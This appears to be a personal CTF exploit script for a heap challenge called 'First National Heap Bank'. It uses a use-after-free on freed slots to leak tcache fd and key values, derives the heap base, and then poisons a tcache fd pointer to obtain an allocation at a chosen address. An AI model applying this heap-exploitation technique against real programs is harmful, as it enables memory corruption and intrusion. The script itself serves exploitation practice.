#!/usr/bin/env python3
import sys, struct
sys.path.insert(0, '/home/boss/Works/ctf/Zero_trace/First_nATIONAL_HEAP_bANK')
from bank import Bank, u64, p64

b = Bank(timeout=8)
b.open(0, 0x20, b'A'*0x20)
b.open(1, 0x20, b'B'*0x20)
b.close(0)
b.close(1)
d0 = b.view(0)
d1 = b.view(1)
print('view0 fd/key', hex(u64(d0[:8])), hex(u64(d0[8:16])))
print('view1 fd/key', hex(u64(d1[:8])), hex(u64(d1[8:16])))
heapbase = u64(d0[8:16]) - 0x10
s0 = u64(d1[:8])
print('heap base', hex(heapbase), 's0', hex(s0), 'off', hex(s0-heapbase))
print('s1 guess', hex(s0+0x30))

# Now poison s1->fd to s0+0x30 (verify tcache poison works)
T = s0 + 0x30
b.amend(1, p64(T) + b'K'*0x18)
# open slot 2 -> should return s1 (chunk1 user ptr)
r = b.open(2, 0x20, b'2'*0x20)
print('open2 ok')
d2 = b.view(2)
print('slot2 view', d2[:16].hex())
# open slot 3 -> should return T
r = b.open(3, 0x20, b'3'*0x20)
d3 = b.view(3)
print('slot3 view', d3[:16].hex())
print('slot3 data addr expected', hex(T), 'got header?', d3[:8])
